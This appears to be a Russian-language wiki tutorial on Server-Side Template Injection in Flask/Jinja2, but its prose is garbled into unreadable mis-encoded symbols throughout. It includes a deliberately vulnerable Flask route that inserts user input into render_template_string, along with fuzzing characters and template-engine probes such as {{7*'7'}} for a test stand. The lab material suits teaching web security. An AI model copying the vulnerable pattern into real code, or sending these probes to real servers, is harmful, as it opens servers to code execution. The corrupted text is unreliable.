<!--
title: SSTI
description: 
published: true
date: 2025-01-20T11:02:30.585Z
tags: 
editor: ckeditor
dateCreated: 2025-01-15T13:53:46.072Z
-->

<blockquote>
  <p>–¢–µ—Å—Ç–æ–≤—ã–π —Å—Ç–µ–Ω–¥ –¥–æ—Å—Ç—É–ø–µ–Ω –ø–æ –∞–¥—Ä–µ—Å—É <a href="https://ssti.kalovik.ru">ssti.kalovik.ru</a></p>
</blockquote>
<p><strong>SSTI (Server-Side Template Injection)</strong> ‚Äî —ç—Ç–æ <strong>—Ç–∏–ø —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö, –∫–æ–≥–¥–∞ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –≤–Ω–µ–¥—Ä–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –≤ —à–∞–±–ª–æ–Ω –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞</strong>.&nbsp;</p>
<p>–®–∞–±–ª–æ–Ω –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞ ‚Äî —ç—Ç–æ —Ñ–∞–π–ª –∏–ª–∏ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∫–∞–∫ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º. –û–±—ã—á–Ω–æ –æ–Ω –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞ –∏ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –≤ –±—Ä–∞—É–∑–µ—Ä –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.&nbsp;</p>
<p>–ü—Ä–∏ –∞—Ç–∞–∫–µ SSTI –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –≤–Ω–µ–¥—Ä–∏—Ç—å —Å–≤–æ–π —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –∫–æ–¥ –≤ —à–∞–±–ª–æ–Ω –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –µ–º—É –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–π –∫–æ–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ, –º–∞–Ω–∏–ø—É–ª–∏—Ä–æ–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–º–∏ –∏–ª–∏ –ø–æ–ª—É—á–∞—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏.&nbsp;</p>
<p>–†–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—ë–Ω–Ω—ã–µ –≤–µ–∫—Ç–æ—Ä—ã –∞—Ç–∞–∫ –¥–ª—è SSTI –≤–∫–ª—é—á–∞—é—Ç –ø–æ–ª—è –≤–≤–æ–¥–∞, –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞–ø—Ä–æ—Å–∞ –∏ –¥—Ä—É–≥–∏–µ —É–ø—Ä–∞–≤–ª—è–µ–º—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –≤—Ö–æ–¥–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –ø—Ä–æ–≤–µ—Ä—è—é—Ç—Å—è –∏–ª–∏ –Ω–µ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç—Å—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º –¥–æ–ª–∂–Ω—ã–º –æ–±—Ä–∞–∑–æ–º.&nbsp;</p>
<hr>
<h1>–°—Ç–µ–Ω–¥ –¥–ª—è —Ç–µ—Å—Ç–æ–≤</h1>
<p>&nbsp;</p>
<pre><code class="language-plaintext">from flask import Flask, render_template_string
app = Flask(__name__)

@app.route("/profile/&lt;user&gt;")
def profile_page(user):
  template = f"&lt;h1&gt;Welcome to the profile of {user}!&lt;/h1&gt;"

  return render_template_string(template)

app.run()</code></pre>
<p>–≠—Ç–æ—Ç –∫–æ–¥ —Å–æ–∑–¥–∞–µ—Ç —Å—Ç—Ä–æ–∫—É template –∏ –¥–æ–±–∞–≤–ª—è–µ—Ç –≤ –Ω–µ–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –∫–æ–Ω—Ç–µ–Ω—Ç –º–æ–∂–µ—Ç –∑–∞–≥—Ä—É–∂–∞—Ç—å—Å—è –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –¥–ª—è –ª—é–±–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —Å–æ—Ö—Ä–∞–Ω—è—è –ø—Ä–∏ —ç—Ç–æ–º —Å–æ–≥–ª–∞—Å–æ–≤–∞–Ω–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç —Å—Ç—Ä–∞–Ω–∏—Ü—ã.</p>
<p><i>–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ. Flask ‚Äî —ç—Ç–æ –≤–µ–±-—Ñ—Ä–µ–π–º–≤–æ—Ä–∫, –∞ Jinja2 ‚Äî –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤.</i></p>
<h4><strong>–ö–∞–∫ –º–æ–∂–Ω–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å SSTI?</strong></h4>
<p>–†–∞—Å—Å–º–æ—Ç—Ä–∏–º –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –≤—ã—à–µ –∫–æ–¥, –æ—Å–æ–±–µ–Ω–Ω–æ —Å—Ç—Ä–æ–∫—É template. –ü–µ—Ä–µ–º–µ–Ω–Ω–∞—è user, –∫–æ—Ç–æ—Ä–∞—è –≤–≤–æ–¥–∏—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º –≤ URI, –≤—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç—Å—è –Ω–µ–ø–æ—Å—Ä–µ–¥—Å—Ç–≤–µ–Ω–Ω–æ –≤ —à–∞–±–ª–æ–Ω, –∞ –Ω–µ –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –∫–∞–∫ –¥–∞–Ω–Ω—ã–µ. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –≤—Å–µ, —á—Ç–æ –≤–≤–æ–¥–∏—Ç—Å—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, –±—É–¥–µ—Ç –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∏—Ä–æ–≤–∞—Ç—å—Å—è –¥–≤–∏–∂–∫–æ–º –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.</p>
<h4><strong>–ö–∞–∫–æ–≤–æ –≤–ª–∏—è–Ω–∏–µ SSTI?</strong></h4>
<p>–ö–∞–∫ —Å–ª–µ–¥—É–µ—Ç –∏–∑ –Ω–∞–∑–≤–∞–Ω–∏—è, SSTI ‚Äî —ç—Ç–æ —ç–∫—Å–ø–ª–æ–π—Ç –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ —Å–µ—Ä–≤–µ—Ä–∞ (server-side), –∞ –Ω–µ –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∫–ª–∏–µ–Ω—Ç–∞, —Ç–∞–∫–æ–π –∫–∞–∫, –Ω–∞–ø—Ä–∏–º–µ—Ä, Cross-Site Scripting (XSS).</p>
<p>–≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —É—è–∑–≤–∏–º–æ—Å—Ç—å –±–æ–ª–µ–µ –∫—Ä–∏—Ç–∏—á–Ω–∞, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤–º–µ—Å—Ç–æ –∑–∞—Ö–≤–∞—Ç–∞ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–Ω–∞ –≤–µ–±-—Å–∞–π—Ç–µ (–¥–ª—è —á–µ–≥–æ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è XSS) –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –∑–∞—Ö–≤–∞—Ç–∏—Ç—å —Å–µ—Ä–≤–µ—Ä.</p>
<p>–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ SSTI –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ –±–µ–∑–≥—Ä–∞–Ω–∏—á–Ω—ã, –æ–¥–Ω–∞–∫–æ –æ—Å–Ω–æ–≤–Ω–∞—è —Ü–µ–ª—å —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —É–¥–∞–ª–µ–Ω–Ω–æ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–¥–∞ (RCE).</p>
<h1><strong>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏</strong></h1>
<h4><strong>–ü–æ–∏—Å–∫ —Ç–æ—á–∫–∏ –≤–Ω–µ–¥—Ä–µ–Ω–∏—è</strong></h4>
<p>–°—Ç—Ä–æ–∫–∞ —ç–∫—Å–ø–ª–æ–π—Ç–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –∫—É–¥–∞-—Ç–æ –ø–µ—Ä–µ–¥–∞–Ω–∞. –≠—Ç–æ –∏ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è —Ç–æ—á–∫–æ–π –≤–Ω–µ–¥—Ä–µ–Ω–∏—è. –°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Å—Ç, —Å –∫–æ—Ç–æ—Ä—ã–º–∏ –º—ã –º–æ–∂–µ–º –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–æ–≤–∞—Ç—å –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, URL-–∞–¥—Ä–µ—Å (–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –≤ –Ω–µ–º) –∏–ª–∏ –ø–æ–ª–µ –≤–≤–æ–¥–∞. –í–∞–∂–Ω–æ —Ç–∞–∫–∂–µ –Ω–µ –∑–∞–±—ã–≤–∞—Ç—å –ø—Ä–æ–≤–µ—Ä—è—Ç—å –Ω–∞–ª–∏—á–∏–µ —Å–∫—Ä—ã—Ç—ã—Ö –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö, —ç—Ç–æ –æ—á–µ–Ω—å —É–¥–æ–±–Ω–æ –¥–µ–ª–∞—Ç—å –ø—Ä–∏ –ø–æ–º–æ—â–∏ –ø—Ä–æ–∫—Å–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, Burp.</p>
<p>–í –Ω–∞—à–µ–º –ø—Ä–∏–º–µ—Ä–µ –µ—Å—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü–∞, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–π —Ö—Ä–∞–Ω–∏—Ç—Å—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ: http://10.10.237.109:5000/profile/&lt;user&gt;. –≠—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥.</p>
<p>–ï—Å–ª–∏ –º—ã –≤–≤–µ–¥—ë–º –∏–º—è, —Ç–æ —É–≤–∏–¥–∏–º –≤ –ø—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/3f1a65a147ef1319b7e2e.png">
  <figcaption>–í–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü–∞ –ø—Ä–æ—Ñ–∏–ª—è –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏</figcaption>
</figure>
<p style="text-align:center;">&nbsp;</p>
<h4><strong>–§–∞–∑–∑–∏–Ω–≥</strong></h4>
<p>–§–∞–∑–∑–∏–Ω–≥ ‚Äî —ç—Ç–æ –º–µ—Ç–æ–¥ –ø–æ–∏—Å–∫–∞ –∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Å–µ—Ä–≤–µ—Ä–∞ –ø—É—Ç–µ–º –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö —Å–∏–º–≤–æ–ª–æ–≤ —Å —Ü–µ–ª—å—é –Ω–∞—Ä—É—à–∏—Ç—å —Ä–∞–±–æ—Ç—É —Å–∏—Å—Ç–µ–º—ã.</p>
<p>–≠—Ç–æ –º–æ–∂–Ω–æ –¥–µ–ª–∞—Ç—å –≤—Ä—É—á–Ω—É—é –∏–ª–∏ —Å –ø–æ–º–æ—â—å—é —Å–ø–µ—Ü–∏–∞–ª—å–Ω–æ–≥–æ –ü–û (–Ω–∞–ø—Ä–∏–º–µ—Ä, ffuf –∏–ª–∏ Burp Intruder). –í —ç—Ç–æ–π –∑–∞–¥–∞—á–µ –≤ –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª—è—Ö –º—ã —Ä–∞—Å—Å–º–æ—Ç—Ä–∏–º —Ä—É—á–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å.</p>
<p>–ö —Å—á–∞—Å—Ç—å—é –¥–ª—è –Ω–∞—Å, –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–æ–≤ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∞–Ω–∞–ª–æ–≥–∏—á–Ω—ã–π –Ω–∞–±–æ—Ä —Å–∏–º–≤–æ–ª–æ–≤ –¥–ª—è ¬´—Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π¬ª, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –±—ã—Å—Ç—Ä–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å, —É—è–∑–≤–∏–º–æ –ª–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∫ SSTI. –ù–∞–ø—Ä–∏–º–µ—Ä, –∏–∑–≤–µ—Å—Ç–Ω–æ, —á—Ç–æ —Å–∏–º–≤–æ–ª—ã ${{&lt;%[%'"}}% –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤–æ –º–Ω–æ–≥–∏—Ö —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–∞—Ö.</p>
<p>–ü—Ä–∏ —Ä—É—á–Ω–æ–º —Ñ–∞–∑–∑–∏–Ω–≥–µ —ç—Ç–∏ —Å–∏–º–≤–æ–ª—ã —Å—Ç–æ–∏—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ –æ–¥–Ω–æ–º—É –≤ —É—è–∑–≤–∏–º—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä, —Ä–∞—Å–ø–æ–ª–∞–≥–∞—è –∏—Ö –æ–¥–∏–Ω –∑–∞ –æ–¥–Ω–∏–º.</p>
<p>–ü—Ä–æ—Ü–µ—Å—Å —Ñ–∞–∑–∑–∏–Ω–≥–∞ –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/f45fdd29d7e023af6b067.png">
  <figcaption>–§–∞–∑–∑–∏–Ω–≥ —Ç–æ—á–∫–∏</figcaption>
</figure>
<p>–ü—Ä–æ–¥–æ–ª–∂–∏–º —ç—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å, –ø–æ–∫–∞ –Ω–µ –ø–æ–ª—É—á–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ –∏–ª–∏ –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ —Å–∏–º–≤–æ–ª—ã –Ω–µ –Ω–∞—á–Ω—É—Ç –∏—Å—á–µ–∑–∞—Ç—å –∏–∑ –≤—ã–≤–æ–¥–∞:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/8a2a34009966029721848.png">
  <figcaption>–ü–æ–ª—É—á–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞</figcaption>
</figure>
<h1><strong>–ò–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–≥–æ —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–∞</strong></h1>
<p>–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ –º—ã –æ–ø—Ä–µ–¥–µ–ª–∏–ª–∏, –∫–∞–∫–∏–µ —Å–∏–º–≤–æ–ª—ã –≤—ã–∑–≤–∞–ª–∏ –æ—à–∏–±–∫—É –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –ø—Ä–∏—à–ª–æ –≤—Ä–µ–º—è –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å, –∫–∞–∫–æ–π –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è. –í –ª—É—á—à–µ–º –¥–ª—è –Ω–∞—Å —Å–ª—É—á–∞–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± –æ—à–∏–±–∫–µ –±—É–¥–µ—Ç –≤–∫–ª—é—á–∞—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–º –º–µ—Ö–∞–Ω–∏–∑–º–µ —à–∞–±–ª–æ–Ω–æ–≤, —á—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ—Ç —à–∞–≥ –≤—ã–ø–æ–ª–Ω–µ–Ω. –û–¥–Ω–∞–∫–æ, –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ —Ç–∞–∫, –º—ã –º–æ–∂–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–µ—Ä–µ–≤–æ —Ä–µ—à–µ–Ω–∏–π, —á—Ç–æ–±—ã –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/eec553670d3ce7ff7927b.png">
  <figcaption>–î–µ—Ä–µ–≤–æ —Ä–µ—à–µ–Ω–∏–π</figcaption>
</figure>
<p><i>–ò—Å—Ç–æ—á–Ω–∏–∫: </i><a href="https://portswigger.net/web-security/server-side-template-injection"><i>PortSwigger</i></a></p>
<p>–ù–µ—Å–ª–æ–∂–Ω–æ –æ—Ä–∏–µ–Ω—Ç–∏—Ä–æ–≤–∞—Ç—å—Å—è –ø–æ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º—É –¥–µ—Ä–µ–≤—É —Ä–µ—à–µ–Ω–∏–π: –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞–≥—Ä—É–∑–∫—É —Å —Å–∞–º–æ–≥–æ –ª–µ–≤–æ–≥–æ –∫—Ä–∞—è (–∫–æ—Ä–µ–Ω—å –¥–µ—Ä–µ–≤–∞) –∏ –≤–∫–ª—é—á–∏—Ç—å –µ—ë –≤ –Ω–∞—à –∑–∞–ø—Ä–æ—Å. –î–∞–ª–µ–µ, –≤ –∑–∞–ø–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞, –Ω—É–∂–Ω–æ —Å–ª–µ–¥–æ–≤–∞—Ç—å –ø–æ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º —Å—Ç—Ä–µ–ª–∫–∞–º –≤–ø—Ä–∞–≤–æ.</p>
<ul>
  <li>–ó–µ–ª–µ–Ω–∞—è —Å—Ç—Ä–µ–ª–∫–∞ ‚Äî –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç—Å—è —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä–æ–º (—Ç.–µ. 49);</li>
  <li>–ö—Ä–∞—Å–Ω–∞—è —Å—Ç—Ä–µ–ª–∫–∞ ‚Äî –≤—ã—Ä–∞–∂–µ–Ω–∏–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –≤ –≤—ã–≤–æ–¥–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, ${7*7}).</li>
</ul>
<p>–í –Ω–∞—à–µ–º –ø—Ä–∏–º–µ—Ä–µ –ø—Ä–æ—Ü–µ—Å—Å –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/20ad1649ddb8a200987ba.png">
  <figcaption>–î–≤–∏–≥–∞–µ–º—Å—è –ø–æ –∫—Ä–∞—Å–Ω–æ–π —Å—Ç—Ä–µ–ª–∫–µ</figcaption>
</figure>
<p>–¢–∞–∫ –∫–∞–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π –Ω–∞–≥—Ä—É–∑–∫–µ –æ—Ç—Ä–∞–∂–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥, –º—ã –∏–¥–µ–º –ø–æ –∫—Ä–∞—Å–Ω–æ–π —Å—Ç—Ä–µ–ª–∫–µ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/b90bf6ebfbf9962e63167.png">
  <figcaption>–î–≤–∏–≥–∞–µ–º—Å—è –ø–æ –∑–µ–ª—ë–Ω–æ–π —Å—Ç—Ä–µ–ª–∫–µ</figcaption>
</figure>
<p>–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Ä–∞—Å–ø–æ–∑–Ω–∞—ë—Ç –≤–≤–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –µ–≥–æ, –ø–æ—ç—Ç–æ–º—É –º—ã –∏–¥–µ–º –ø–æ –∑–µ–ª–µ–Ω–æ–π —Å—Ç—Ä–µ–ª–∫–µ. –≠—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç—Å—è –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –º—ã –Ω–µ –¥–æ–π–¥–µ–º –¥–æ –∫–æ–Ω—Ü–∞ –¥–µ—Ä–µ–≤–∞ —Ä–µ—à–µ–Ω–∏–π.</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/7deba1a3934e587480960.png">
  <figcaption>–†–∞—Å–ø–æ–∑–Ω–∞—ë–º —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä ‚Äî Jinja2</figcaption>
</figure>
<p>–ì–ª—è–¥—è –Ω–∞ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–µ –≤—ã—à–µ –¥–µ—Ä–µ–≤–æ –º–æ–∂–µ—Ç –≤–æ–∑–Ω–∏–∫–Ω—É—Ç—å –≤–æ–ø—Ä–æ—Å: –ø–æ—á–µ–º—É Jinja2, –∞ –Ω–µ Twig? –í—ã –¥–æ–ª–∂–Ω—ã –∑–Ω–∞—Ç—å, —á—Ç–æ –æ–¥–Ω–∞ –∏ —Ç–∞ –∂–µ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –º–æ–∂–µ—Ç –∏–Ω–æ–≥–¥–∞ –≤–æ–∑–≤—Ä–∞—â–∞—Ç—å —É—Å–ø–µ—à–Ω—ã–π –æ—Ç–≤–µ—Ç –±–æ–ª–µ–µ —á–µ–º –Ω–∞ –æ–¥–Ω–æ–º —è–∑—ã–∫–µ —à–∞–±–ª–æ–Ω–æ–≤.&nbsp;–ù–∞–ø—Ä–∏–º–µ—Ä, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞&nbsp;<code>{{7*'7'}}</code>–≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç&nbsp;<code>49</code> –≤ Twig –∏&nbsp;<code>7777777</code> –≤ Jinja2.&nbsp;–ü–æ—ç—Ç–æ–º—É –≤–∞–∂–Ω–æ –Ω–µ –¥–µ–ª–∞—Ç—å –ø–æ—Å–ø–µ—à–Ω—ã—Ö –≤—ã–≤–æ–¥–æ–≤ –Ω–∞ –æ—Å–Ω–æ–≤–∞–Ω–∏–∏ –æ–¥–Ω–æ–≥–æ —É—Å–ø–µ—à–Ω–æ–≥–æ –æ—Ç–≤–µ—Ç–∞.</p>
<p>–ò—Å—Ö–æ–¥—è –∏–∑ –ø–æ–ª—É—á–µ–Ω–Ω—ã—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤, –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å –≤—ã–≤–æ–¥, —á—Ç–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –º–µ—Ö–∞–Ω–∏–∑–º —à–∞–±–ª–æ–Ω–æ–≤ <strong>Jinja2</strong>.</p>
<p>–ü–æ—Å–ª–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –º–µ—Ö–∞–Ω–∏–∑–º–∞ —à–∞–±–ª–æ–Ω–æ–≤ –Ω–∞–º —Ç–µ–ø–µ—Ä—å –Ω—É–∂–Ω–æ –∏–∑—É—á–∏—Ç—å –µ–≥–æ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å. –õ—É—á—à–∏–π –∏—Å—Ç–æ—á–Ω–∏–∫ –¥–ª—è —ç—Ç–∏—Ö —Ü–µ–ª–µ–π ‚Äî&nbsp;<a href="https://jinja.palletsprojects.com/en/2.11.x/">–æ—Ñ–∏—Ü–∏–∞–ª—å–Ω–∞—è –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è</a>.</p>
